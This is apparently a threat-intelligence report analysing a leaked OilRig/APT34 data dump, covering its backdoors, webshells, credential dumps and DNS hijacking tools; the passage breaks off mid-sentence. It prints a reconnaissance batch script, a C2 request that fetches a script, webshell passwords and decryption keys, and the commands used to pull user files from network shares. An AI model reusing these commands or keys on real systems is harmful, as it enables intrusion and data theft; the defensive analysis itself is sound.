Since then, OilRig has been\nheavily researched by the rest of the industry and has been given additional names such as\nAPT34 and Helix Kitten. The OilRig group is not particularly sophisticated but is extremely\npersistent in the pursuit of their mission objective and, unlike other some other espionage\nmotivated adversaries, are much more willing to deviate from their existing attack\nmethodologies and use novel techniques to accomplish their objectives. Over time, through\nour research we have been able to reveal specific details of how their attacks are executed,\n\n\n-----\n\n[the tools they use, and even what their development cycle may be like by tracking their use](https://unit42.paloaltonetworks.com/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/)\nof [VirusTotal as a detection check system. Due to the nature of the data we had access to](http://www.virustotal.com/)\nhowever, our perspective was primarily from a target or victim perspective which is generally\nlimited to the artifacts at the time of attack.\n\nRecently, a data dump was leaked and made available to the public claiming to be data in\nrelation to OilRig activity from the operations side. We retrieved the data dump, which\nincluded credential dumps, backdoors, webshells, and other files of interest. Several media\noutlets and other researchers have since performed their own evaluation, and in our\nassessment, we found the artifacts contained in data dump are indeed consistent with known\nOilRig operations and toolsets. In addition, the data dump allowed us to retroactively\ncompare our previous research with OilRig’s operational data. This allowed us to fill in\npreviously existing gaps of OilRig’s attack life cycle in addition to validating the accuracy of\nour research. By analyzing the data dump, we have been able to identify exactly how the\nBONDUPDATER backdoor and its server component functions, the appearance and\nfunctionality of several webshells in deployment by OilRig, each of these tools’ internal\noperational names, and a better understanding of how widespread the OilRig operations may\nactually be from a global perspective.\n\nThe organizations possibly under attack by OilRig is widely-spread across the spectrum of\nindustry verticals, spanning from government, media, energy, transportation and logistics,\nand technology service providers. In total we identified nearly 13,000 stolen credentials, over\n100 deployed webshells, and roughly a dozen backdoor sessions into compromised hosts\nacross 27 countries, 97 organizations, and 18 industries.\n\nThe information contained in this data dump include:\n\nStolen credentials\nPotential systems to login to using stolen credentials\nDeployed webshell URLs\nBackdoor tools\nCommand and control server component of backdoor tools\nScripts to perform DNS hijacking\nDocuments identifying specific individual operators\nScreenshots of OilRig operational systems\n\n## The Leak\n\nIn mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with\nthe user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal\ntools and data used by the OilRig group. The initial claim included several screenshots of\nsystems potentially in use by OilRig operators for attacks, a script that appeared to be used\nfor DNS hijacking, and a password protected archive with the filename Glimpse.rar\npurporting to contain the command and control server panel for an OilRig backdoor. Soon\n\n\n-----\n\nafter, a Twitter account with the user handle @dookhtegan appeared claiming they also had\naccess to data dumps involving internal tools and data used by the OilRig group, as seen in\nFigure 1. This account used an image from 2004 of a high-profile Iranian asylum seeker\nnamed Mehdy Kavousi who famously sewed his eyes and mouth shut to signify that rejecting\nhis asylum claim and sending him back to Iran would be akin to putting him to death. It is\nunknown why this specific image was chosen, other than perhaps as a symbol of protest.\nSince the initial account creation, a stylized version of the original has been substituted as\nthe profile image, making it far more difficult to understand who the original individual was.\n\n\n-----\n\n-----\n\n_Figure 1. Tweets by @dookhtegan providing files associated with the OilRig leak_\n\nThis account continued a series of tweets voicing protest against the OilRig group and\nattributing its operations with a specific nation state and organization. Unit 42 is unable to\n[validate this level of attribution, but a 2018 report from the United States National](https://www.dni.gov/files/NCSC/documents/news/20180724-economic-espionage-pub.pdf)\nCounterintelligence and Security Center stated the OilRig group originates from an Iranian\nnexus. The account continued to post tweets with direct links to operational data dumps\nhosted on an anonymous file sharing service.\n\nThe files posted included the previously password protected archive Glimpse.rar, as well as\nnew archives containing hundreds of harvested credentials from compromised organizations\nalong with details on exposed login prompts. There were also links to webshells previously\nand possibly currently deployed, the webshell source codes, as well as another backdoor\nand its server component.\n\nThis account was suspended in short order, but immediately after the suspension, an\nalternate account with the username @dookhtegan1 with the same stylized profile image\nappeared and is still currently active. This account mirrors the previous messages of\nexposing the OilRig group but no longer contains links to data dumps, instead instructing\nthose that are interested in the data to join them in a private Telegram channel. Figure 2\nshows this second Twitter account providing a Telegram channel to leak the data.\n\n\n-----\n\n_Figure 2. Tweets by second account @dookhtegan1 providing a Telegram channel with the_\n_leaked files_\n\n## Data Dump Contents\n\nThe contents of the data dump includes various types of datasets that appear to be results\nfrom reconnaissance activity, initial compromises, and tools the OilRig operators use against\ntarget organizations. The affected organizations spread across the spectrum of industry\nverticals, spanning from government, media, energy, transportation and logistics, and\ntechnology service providers. The datasets included:\n\nStolen credentials\nPotential systems to login to using stolen credentials\nDeployed webshell URLs\nBackdoor tools\nCommand and control server component of backdoor tools\n\n\n-----\n\nScript to perform DNS hijacking\nDocuments identifying specific individual operators\nScreenshots of OilRig operational systems\n\nWe analyzed each type of dataset other than the documents containing detailed information\non alleged OilRig operators and they remain consistent with previously observed OilRig\ntactics, techniques, and procedures (TTPs). While we are unable to confirm the validity of the\ndocuments detailing individual operators simply due to a lack of visibility into that realm, we\nalso have no reason to doubt their validity either.\n\nAn interesting artifact we found in the data dump are the OilRig threat actors’ own internal\nnames of various tools we have been tracking. Table 1 provides the internal operational\nnames and the names we use to track these tools.\n\n**Tool Type** **Internal Name** **Industry Name**\n\n_Backdoor_ Poison Frog BONDUPDATER\n\n_Backdoor_ Glimpse Updated BONDUPDATER\n\n_Webshell_ HyperShell TwoFace loader\n\n_Webshell_ HighShell TwoFace payload\n\n_Webshell_ Minion TwoFace payload variant\n\n_DNS Hijacking Toolkit_ webmask Related to DNSpionage\n\n_Table 1. Tools exposed in the OilRig data leak with their internal names mapped to the_\n_names used by the security community_\n\n## Credential Dumps\n\nIn our analysis, we found that a total of fifteen organizations had their credentials stolen in\nsome fashion and stored in text files for the OilRig group to then abuse for additional attacks.\nIn total, nearly 13,000 sets of credentials are included in the data dump. The credentials\nappear to have been stolen via multiple techniques, including using post-exploition password\nrecovery tools such as MimiKatz or its variant ZhuMimiKatz. In addition to these tools, we\nbelieve OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using\ntraditional credential harvesting toolkits as we discussed in the Striking Oil blog published in\n[September 2017.](https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/)\n\nIt appears to us that one organization had its entire Active Directory dumped out, making up\nmost of the credentials we found in the data dump.\n\n\n-----\n\nThe types of organizations listed in this data dump spread across multiple industry verticals\nbut were all largely located in the Middle East region. We are unable to confirm if all of these\nstolen credentials are indeed valid sets of credentials, but based upon previously observed\nactivity, timestamping, and known behaviors, it is highly probable that these credentials were\nor may still be valid.\n\nAssuming the lists of credentials are valid, the mass collection confirms our hypothesis that\nthe OilRig group maintains a heavy emphasis on credential based attacks along with the\nother types of attacks they deploy. This is consistent with most espionage-motivated\nadversaries, as once the adversary gains access via legitimate credentials, they are able to\nmasquerade as a legitimate user and essentially become an insider threat. This type of\nactivity becomes significantly harder to detect compared to using custom tools as the\nadversary masquerades as a legitimate user while most protections are intended to catch\nmalware.\n\nIn our past research, based off artifacts we had gathered, we had internally postulated the\nOilRig group likely had a propensity to immediately attempt to escalate privileges once they\nhave their initial compromise, then try to move laterally into the local Microsoft Exchange\nserver where they would then able to harvest more credentials and implant additional tools\n[such as webshells and IIS backdoors. In a](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/) [presentation provided by a FireEye researcher,](https://www.youtube.com/watch?time_continue=1333&v=1CGAmjAV8nI)\nthey documented this exact attack lifecycle for incidents associated with OilRig in addition to\nbe deploying a post-exploitation toolkit called Ruler within their attack playbook as well. Ruler\nis an open-source penetration testing toolkit which is predicated on being able to access\nOutlook Web Access (OWA) or OWA via stolen credentials, then abusing built-in functions to\nperform a variety of actions including retrieving the Global Address List, setting malicious\nemail rules, and in OilRig’s case, performing remote code execution.\n\n[The specific function of Ruler the OilRig group was using is the Ruler.Homepage function.](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)\nThis function abuses a capability in Microsoft Outlook which allows an administrator or a user\nto set a default homepage for any folder inside their inbox. Using stolen credentials, the\noperator would use Ruler to send commands to the target organization’s OWA instance via\nan RPC protocol which would then remotely set an arbitrary homepage for the compromised\ninbox’s folders. The operator would then include commands in the homepage to\nautomatically retrieve and execute malicious code. In OilRig’s case, they included commands\nto retrieve and execute a backdoor, immediately giving them access to the endpoint in use\nby the user whose credentials had been stolen.\n\n## Backdoors\n\nThe data dump included two backdoors that we had previously associated with the OilRig\nthreat group, both of which we had previously referred to as BONDUPDATER. Generally\nspeaking, we are able to retrieve the implant or payload involved in an attack but are\ngenerally blind to the server side component. This data dump provided the backdoors and\n\n\n-----\n\ntheir associated server components which provides us a different perspective on how the\nbackdoors function. In addition, we discovered that the backdoors are actually called\nGlimpse and Poison Frog internally by OilRig and are functionally two different tools.\n\n### Glimpse\n\nThe Glimpse tool within the data dump is related to the updated BONDUPDATER tool that\nwe discovered being delivered to a Middle East government organization in a report we\n[published on September 2018. We recently mentioned this tool in another report on April 16,](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/)\nas this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2,\nspecifically using TXT queries to receive information from the C2 server.\n\nThe data dump included the following three requisite components of the Glimpse tool seen in\nTable 2, as well as a Read me.txt file that explains how to set up and use Glimpse.\n\n**Component** **Description**\n\nAgent Powershell scripts meant to run on compromised systems.\n\nServer Command and control server that communicates via DNS tunneling\n\nPanel Graphical User Interface that allows actors to issue commands, upload and\ndownload files to Agents via the Server\n\n_Table 2. The three components of the Glimpse tool_\n\nGlimpse is a PowerShell script that contains the comment version 2.2, which suggests the\nOilRig group considers this a specific version of the tool and that it likely has included prior\nversions.\n\nThe Glimpse panel, versioned “v1.0.5” is the tool that the actor uses to organize the various\nagents installed on compromised systems. The panel allows the actors to issue commands\nin addition to uploading files to and downloading files from the compromised endpoints.\nAccording to the compilation time, the developer of the Glimpse panel created this tool on\nSeptember 1, 2018. Figure 3 shows the main Glimpse panel with three different agents listed\nin a test environment.\n\n\n-----\n\n_Figure 3. The Glimpse panel showing three compromised systems_\n\nTo interact with a specific agent, the actor selects the entry to open in the agent control\npanel. The agent control panel has three tabs that have interfaces that allow the actor to\nissue commands, as well as upload and download files to and from the agent. The command\ntab will show previously issued commands, when they were issued, and their status, as seen\nin Figure 4.\n\n\n-----\n\n_Figure 4. Glimpse s Agent Control Panel showing the interface actors would use to send_\n_commands_\n\nThe actor clicks the command to view the results in a popup window named “Result Viewer”.\nFigure 5 shows the result viewer window showing the results of the issued command.\n\n_Figure 5. The Result Viewer showing the results of an issued command_\n\nThe server portion of Glimpse works in unison with the panel by acting as a DNS server,\nwhich is written in JavaScript and runs in the Node.js runtime. The server has a filename of\nsrvr.js, which according to the Read me.txt file is meant to be run using forever start srvr.js in\nNode.js. Figure 6 shows the Glimpse server responding to an inbound beacon from the\nGlimpse agent and sending a command whoami. The screenshot also shows the Glimpse\nserver receiving the results of the whoami command executed by the agent.\n\n\n-----\n\n_Figure 6. The Glimpse server issuing a command to an agent and receiving the results of the_\n_command_\n\n### Poison Frog\n\nThe second backdoor included in the data dump is named Poison Frog. The dataset includes\nboth the agent that the actor would install on targeted systems and the server that would\nallow the actor to interact with compromised systems. The Poison Frog tool appears to be a\nvariant of BONDUPDATER used in targeted attacks in the Middle East, as reported by\n[FireEye in December 2017.](https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html)\n\nTable 3 shows the files associated with the agent included in the data dump, of which the\ndUpdater.ps1 portion of Poison Frog appears to be the initial variant of BONDUPDATER that\nuses DNS tunneling for its C2 channel as discussed in our recent blog discussing OilRig’s\nDNS tunneling protocols. Interestingly, both of these Poison Frog agent scripts were\n\n\n-----\n\nconfigured to use the domain myleftheart[.]com as its C2 server though we have not seen\nthis domain in any attacks, and we were unable to associate it with any known OilRig\ninfrastructure.\n\n**Filename** **SHA256**\n\npoisonfrog.ps1 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14e\n\nhUpdater.ps1 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd9\n\ndUpdater.ps1 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea33043\n\n_Table 3. Files associated with the Poison Frog agent provided in the leak_\n\nLike the Glimpse C2 server, the Poison Frog server was written in JavaScript and will run in\nNode.js. The Poison Frog server handles both the HTTP and DNS tunneling channels used\nby the hUpdater.ps1 and dUpdater.ps1 scripts. According to the server’s code, the default\ncommand that it would issue to newly infected systems was a batch script contained in a file\nnamed 0000000000.bat. The data dump included the 0000000000.bat file, which when\nexecuted on an infected system would run the following commands to gather information to\nbe sent back to the C2 server:\n\nwhoami\nhostname\nipconfig /all\nnet user /domain\nnet group /domain\nnet group \"domain admins\" /domain\nnet group \"Exchange Trusted Subsystem\" /domain\nnet accounts /domain\nnet user\nnet localgroup administrators\nnetstat -an\ntasklist\n\n\n-----\n\nsysteminfo\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server\nClient\\Default\"\nschtasks /query /FO List /TN \"GoogleUpdatesTaskMachineUI\" /V | findstr /b /n\n/c:\"Repeat: Every:\"\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get\ndisplayName /Format:List\n\nThis batch script is also interesting as it uses echo commands to include headers before\neach of the command results. The headers included in this batch script looked very familiar,\nas we had seen a very similar batch script provided via the HTTP C2 channel for the\nHelminth backdoor delivered by a Clayslide delivery document as we reported in October\n2016 (SHA256: 903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996).\nThe following HTTP request from the Helminth backdoor (SHA256:\n1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c) downloaded\nthe similar batch script:\n\nGET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1\n\nHost: update-kernal[.]net\n\nConnection: Keep-Alive\n\nWe performed a code comparison to visualize the similarities between the batch script\ndelivered as the default command in Poison Frog is to the script provided to the Helminth\nbackdoor. Figure 7 shows just how similar these two batch scripts are with several of the\nheaders being exactly the same and a majority of the commands being the same with the\nHelminth commands having the 2>&1 suffix to include command errors with the output.\n\n_Figure 7. Code comparison between the default batch script issued by Poison Frog’s C2 and_\n_a batch script received by the Helminth Trojan_\n\n\n-----\n\n## Webshells\n\nThe data dump included several different webshells apparently used by OilRig to interact\nwith compromised servers. The three webshells included in the dump had names\nHyperShell, HighShell, and Minion, but it appears that Minion is likely a variant of HighShell\nbased on code, filename, and functionality overlaps. The HyperShell and HighShell\nwebshells are variants of what we track as TwoFace, with HyperShell being related to the\nTwoFace loader and HighShell being related to the TwoFace payload, as we reported in July\n2017. In addition to the actual webshells in use by OilRig, the data dump includes lists of\nexisting deployments of webshells hosted on compromised websites. Over 100 links to\nwebshells are listed, spanning across 87 organizations in 26 countries across four continents\nas seen in Figure 8.\n\n\n-----\n\n_Figure 8. Geographic location of webshells of impacted organizations_\n\n### Hypershell\n\n\n-----\n\nThe HyperShell webshell included in the data dump (SHA256:\ne483eee77fcc5ef11d5bf33a4179312753b62ec9a247dd14528cc797e7632d99) is an\nexample of the 3DES variant of the TwoFace loader that we called TwoFace++ in as we\n[reported in July 2017.](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)\n\nDuring our initial research into the TwoFace++ loader, we were unable to extract the\nembedded payload using the same brute forcing technique that we used on the initial\nTwoFace loader samples.\n\nThe initial TwoFace loader samples decrypted an embedded webshell using an actor\nprovided key, which was modified by using simple arithmetic operators (\"+\" or \"-\" specifically)\nand a salt string embedded within the loader webshell, whose result decrypts an embedded\npayload using simple arithmetic operators (again, \"+\" or \"-\" specifically). We were able to\nbrute force the actor-provided key using the inverse arithmetic operations using the\nembedded salt and embedded ciphertext, so we were able to extract the embedded\nwebshells with ease.\n\nUnlike the initial TwoFace loader, the TwoFace++ loader used the 3DES cipher and a\nSHA256 hash of a string provided by the actor and used as a key, so we were unable to\nextract the embedded webshells as we were unable to determine the actor provided key.\nHowever, the HyperShell sample in this dump provided the necessary information to\ndetermine the actor-provided key needed to decrypt its embedded webshell. Like many initial\nTwoFace loader samples, the HyperShell sample includes a string within the HTML tags\n<pre> and </pre> that is displayed in the browser if a password is not supplied and/or the\nTwoFace++ loader is unable to extract the embedded payload webshell. The pre tags within\nthe HyperShell sample are:\n\n<pre><%= Server.HtmlEncode(\"NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a\") %></pre>\n\nFigure 9 shows HyperShell displaying the content within the \"pre\" tags within the browser.\n\n_Figure 9. HyperShell displaying the password within <pre> tags_\n\nWe determined the string in the pre tags is the actor provided password, which the webshell\nuses as a key to decrypt the embedded payload. We determined this by following the\nprocess in which the TwoFace++ loader webshell uses the actor provided password to\n\n\n-----\n\nauthenticate and decrypt the embedded webshell:\n\nAppend a string to the password that acts as a salt\nObtain the SHA1 hash of the resulting string containing the password and salt\nBase64 encode the SHA1 hash\nCompare the encoded hash with hardcoded base64 string\nIf the encoded hash matches hardcoded base64 string then the inbound request is\nauthenticated\nGenerates the SHA256 hash of the password string\nBase64 encodes the SHA256 hash and uses the first 24 characters as a key\nUses 24-character key and the 3DES cipher to decrypt the embedded webshell\n\nNow let's look at how this works with the values in the TwoFace++ loader sample. The actor\nprovided password of NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a has the hardcoded salt string\naqB2nU65TgFoEfdVqiAddBQLInc9 appended to it. The resulting string of\nNxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7aaqB2nU65TgFoEfdVqiAddBQLInc9 has a SHA1 hash of\n9d3ff106fbc3508b8453c7d6f285543d0b9c2721, which is base64 encoded to\nnT/xBvvDUIuEU8fW8oVUPQucJyE=. The hardcoded base64 encoded password within the\nsample is nT/xBvvDUIuEU8fW8oVUPQucJyE=, which confirms that the string provided in the\npre tags is the password.\n\nOnce authenticated, the TwoFace++ loader uses the password to decrypt the embedded\nwebshell. To use the password as a key for 3DES, TwoFace++ will generate the SHA256\npassword of the NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a string that results in a hash of\n11f66b55f3d24303621e5ef9565b02a576cc58bc5f8789cae96c3d400064b90e. The SHA256\nhash is then base64 encoded, which results in an encoded string of\nEfZrVfPSQwNiHl75VlsCpXbMWLxfh4nK6Ww9QABkuQ4=, of which the first 24 characters\nare used as the 3DES key. The key EfZrVfPSQwNiHl75VlsCpXbM is used as the key for\n3DES, which results in a webshell (SHA256:\nd2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) that matches\nthe TwoFace payload webshell we published in our original blog. This resulting webshell also\nappears to be a variant of HighShell, specifically version v5.0.\n\nWe compared the v5.0 version of HighShell to the TwoFace payload (SHA256:\n54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f), as they are\nvisually extremely similar. Figure 10 shows the two webshells sharing the same user\ninterface, with two notable exceptions in the HighShell webshell, specifically a version\nnumber “v5.0” and three little boxes at the bottom left used to display error messages and\nthe results of commands.\n\n\n-----\n\n_Figure 10. Animation showing the differences between the HighShell v5.0 and TwoFace_\n_payload_\n\nTo supplement the visual similarities, we performed an analysis of the code of the two\nwebshells to identify overlaps. The two webshells share a significant amount of code with a\nmajority of the differences being slightly different variable and function names. The most\nnotable difference is that the HighShell v5.0 webshell includes a salt value it applies to the\nactor provided password that it uses for authentication. Figure 11 shows the code\ncomparison between the TwoFace payload on the left (SHA256:\n54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f) and HighShell\nv5.0 on the right (SHA256:\nd2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619). The code\ncomparison specifically shows the HighShell code including a salt variable containing\ndi2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left.\n\n\n-----\n\n_Figure 11. Comparison between HighShell v5.0 and TwoFace payload_\n\nThe code comparison in Figure 11 also highlights how much code is shared between the two\nsamples. We believe the TwoFace payload is a predecessor to the HighShell v5.0 webshell,\nthe latter of which was created during the ongoing development efforts carried out by OilRig\nthroughout their operations.\n\n### HighShell\n\nThe data dump also included a webshell named HighShell, which we discovered was\ndropped by HyperShell as discussed in the previous section. The dump included many\ndifferent HighShell samples, of which we have identified at least three different versions,\nseen in Table 4. The increasing version numbers suggest that OilRig continually developed\nHighShell to be used in their operations.\n\n**SHA256** **Filename**\n\nfe9cdef3c88f83b74512ec6400b7231d7295bda78079b116627c4bc9b7a373e0 error4.aspx\n\n22c4023c8daa57434ef79b838e601d9d72833fec363340536396fe7d08ee2017 HighShell.a\n\n691801e3583991a92a2ad7dfa8a85396a97acdf8a0054f3edffd94fc1ad58948 HighShellLo\n\n_Table 4. Three HighShell webshells within data leak that specified their version_\n\nThe version numbers themselves do not appear to be consistently updated, however. For\ninstance, the HighShell webshell (SHA256:\nd2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) extracted\nfrom HyperShell in the prior section showed a version number of “v5.0”, which is obviously\ndifferent than the “v5.0” HighShell with a filename of error4.aspx seen in Figure 12.\n\n\n-----\n\n_Figure 12. HighShell v5.0 with a new color scheme and explorer tab_\n\nFigure 12 shows a second HighShell v5.0 sample with a different color scheme used for its\nuser interface; however, a majority of the functionality is the same as the other v5.0 sample\nextracted from HyperShell. One interesting addition to this variant of HighShell v5.0 is the\nintroduction of a tabular interface that includes a main tab and an explorer tab. The main tab\ncontains the same functionality as the TwoFace payload and the other v5.0 HighShell\nsample. The explorer tab, as seen in Figure 13 allows the actors to navigate the\ncompromised server’s file system.\n\n\n-----\n\n_Figure 13. HighShell v5.0 explorer tab allows actor to navigate the file system_\n\nThe HighShell v7.1 variant from the data dump contains similar functionality to its\npredecessors and continued the tabular approach but expanded even further by splitting out\nthe main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”,\n“Download”, “Sql Server” and “Change Time”. Figure 14 shows HighShell v7.1 and its\nmultiple tabs.\n\n_Figure 14. HighShell v7.1 spreads out the webshell by using separate tabs for the various_\n_functionality_\n\n\n-----\n\nThe data dump also included an archive named ShellLocal-v8.8.5.rar that contains another\nHighShell variant. The archive name would suggest the HighShell variant was version v8.8.5,\nbut the user interface suggested it was version 8.6.2, as seen in Figure 15. This variant of\nHighShell shares code from its predecessors, but it appears that OilRig re-architected this\nwebshell to include a front end user interface that interacts with a back end script via AJAX\nweb requests. In addition to the change in architecture, this version of HighShell has an\nenhanced interface as well.\n\n_Figure 15. HighShell v8.6.2 with updated interface_\n\nThe 8.6.2 version of HighShell shares significant functionality with its predecessors, but also\ncontains several new and interesting functionalities as well. The interesting features of this\nversion of HighShell includes several executable modules, a network downloader\nfunctionality, and a spy check feature.\n\n### Modules\n\nHighShell 8.6.2 includes the ability to use several modules included with the webshell. The\nmodules are PE executables that come prepackaged with the webshell that further extend its\ncapabilities. Table 5 shows the modules provided with this variant of HighShell. The webshell\nwill use the 7za module to archive files from the Explorer tab, while the nbtscan module\nallows the webshell to scan the network for systems to build an IP list of system it can\ninteract with. We were unable to determine how the webshell would use the remote execute\nmodule, as the webshell does not actually seem to use it.\n\n**Filename** **SHA256**\n\n\n-----\n\n7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229\n\nnbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e\n\nrx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e\n\n_Table 5. Modules included with HighShell v8.6.2_\n\n### Spy Check\n\nThe Spy Check functionality appears at the top right corner of the webshell as a box with a\ncountdown timer. The timer starts at 300 and decrements every second, suggesting that the\nwebshell executes the Spy Check functionality every five minutes. The Spy Check\nfunctionality is rather interesting, as we do not know its exact purpose other than either\ndisplaying a red box with a spy icon or a green box with a heart icon. We believe this\nfunctionality was meant to notify the actor in the event that they were using an altered\nHighShell front end webshell, possibly to avoid using the webshell if it had been detected\nand modified by a third-party. We are speculating this is the intended function because the\nSpy Check function begins by reading the .aspx file of the HighShell front end\n(HighShellLocal.aspx in this case). The Spy Check then generates the SHA256 hash of the\nHighShell front end and compares it with a hardcoded SHA256 of\nf35e566e28be5b3257670be6e125eb90814b9cb27df997090cea0b7a22fbd75c to determine\nif the webshell had been modified. If the hashes do not match, the webshell will display a red\nbox with spy icon, as seen in Figure 15, or a green box with a heart icon if it matches. All\nknown samples display the red box with a spy icon, suggesting that the developer of\nHighShell did not update this functionality during development efforts or that the samples\nhave been modified in some way.\n\n### Network Downloader\n\nThe Network Downloader functionality allows the actor to quickly upload user files from\nremote victim systems. To use this functionality, the actor must provide information within the\n\"Target Computer\" portion of the webshell, specifically a network administrator username\nand password, as well as a list of IP addresses of remote systems added in the \"Select\nComputer\" drop down. Before performing the network download, the webshell checks the\nstorage volume on the server that the webshell is running on to determine if it has more than\n30 GB of free space. If the server has less than 30 GB of free space the webshell will not\nperform the activity, which indicates that the developer of the webshell expects a high\n\n\n-----\n\nvolume of data downloaded from the victim network. The webshell will iterate through the IP\nlist and perform a series of commands for each IP, starting off with using the following\ncommand to connect to the remote system:\n\nnet use [IP address] /user:[domain admin username] [domain admin password] 2>&1\n\nAfter connecting to the remote system with net use, the webshell will run the following\ncommand to obtain a list of user folders:\n\ndir /b [IP address]\\c$\\Users 2>&1\n\nWith a list of user folders, the webshell will iterate through the list of users and enumerate all\nof the files in the following folders:\n\n[IP address]\\c$\\Users\\[username]\\Desktop\n\n[IP address]\\c$\\Users\\[username]\\Documents\n\n[IP address]\\c$\\Users\\[username]\\Downloads\n\nThe Network Downloader function will gather all the files in these folders and use 7-Zip to\ncompress and archive the files. The webshell will save the archives locally to the server in\nthe C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following\nstructure:\n\n[IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]\n[day]-[hours]-[minutes]-[seconds].7z\n\nIt is likely that the threat actors use this functionality to rapidly check for new files created by\nusers on the network.\n\n## Minion\n\nMinion appears to be another webshell related to HighShell, as it contains similar\nfunctionality and significant code overlap. Based on the login functionality within Minion, we\nbelieve the same entities were involved in the development of Minion and HyperShell. To use\nMinion, the actor must provide the username of admin and a password to authenticate\nbefore using the webshell. To authenticate, the password has the string\nO%tG7Hz57kvWk35$D*)s$1l$pUpLnBw)apHR!xYZWZu7X#^w7$mCArmQMAa&sRBG\nappended to it as a salt value. The webshell generates the SHA256 hash of the resulting\nstring and base64 encodes it to compare with the hardcoded string of\nm6m8CCWa/u820mie8bX3HKIx1+WQkB+lbmniyXWKB+8=. The password and salt string\nmust result in a SHA256 hash of\n9ba9bc08259afeef36d2689ef1b5f71ca231d7e590901fa56e69e2c9758a07ef to properly\nauthenticate. This is the exact same process used to authenticate/decrypt within HyperShell.\n\n\n-----\n\nMuch like HighShell version 8.6.2, Minion includes modules to extend the webshell s\nfunctionality. Table 6 shows the modules included with Minion, three of which are the same\nexact files as seen in the HighShell and Minion including Hobocopy and a port scanning,\nscreenshot tool called Tardigrade.\n\n**Filename** **SHA256**\n\n7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa02\n\nhb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62\n\nnbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e\n\nrx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e\n\ntardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a988753\n\n_Table 6. Modules included with the Minion webshell_\n\n## DNS Hijacking Script\n\n[In November 2018, Cisco Talos published research on an attack campaign named](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)\nDNSpionage. It involved attacks using malware to compromise individual endpoints, but\nmost interestingly described an effort to specifically hijack DNS entries of government\norganizations to redirect visitors to likely malicious, adversary operated systems. Both\n[FireEye and](https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html) [Crowdstrike followed up with their own assessments for the DNS hijacking](https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/)\nefforts, and described operations extending back to January 2017. No attribution to any\nknown adversary groups was provided, other than that the target radius was primarily in the\nMiddle East and the adversary was also likely operating out of that region.\n\n\n-----\n\nIn this data dump, a tool called webmask is included which appears to be a series of scripts\nspecifically meant to perform DNS hijacking. An informational document is included titled\nguide.txt, as seen in Figure 16 that provides instructions to the operator on how to execute\nthe DNS hijacking attack using the provided tools. Based upon the instructional guide and\nthe provided tools, this package appears consistent with the methodologies FireEye outlined\nin their research on how these attacks were executed, including specific details such as the\nuse of ICAP via a proxy passthrough, in this case specifically squid, and using certbot to\ncreate a Let’s Encrypt SSL certificate.\n\n_Figure 16. Instructions within guide.txt explaining how to carry out DNS hijacking attack_\n\nIn one part of guide.txt, an example target appears to be provided, with a corresponding\nadversary IP (185.162.235[.]106) for the legitimate domain to be redirected to. Analysis of\nthis IP provides several interesting data points, including possible relationships to previously\nobserved OilRig infrastructure. Examining the hosting provider shows that the IP is\nassociated with an Iranian hosting provider called NovinVPS. The autonomous system name\nof the IP shows that the allocation is controlled by Serverius Holding B.V., which is an\nautonomous system name we have previously seen associated with the OilRig group. In fact,\nexamining the Class C IP block of 185.162.235[.]0/24 shows at least two other IPs we have\npreviously identified as in use by the OilRig group for C2 servers. 185.162.235[.]29 and\n185.162.235[.]121 and their associated domains, office365-management[.]com and msofficecdn[.]com respectively. Office365-management[.]com was first identified in October 2017 as\na C2 servers for OilRig operations delivering the ISMInjector backdoor. Later in February\n2018 we were able to link the entire grouping of infrastructure to another campaign delivering\n\n\n-----\n\nthe OopsIE backdoor via the reuse of WHOIS registrant artifacts, shared SSL certificates,\nand a shared Class C IP block. Figure 17 shows the relationship 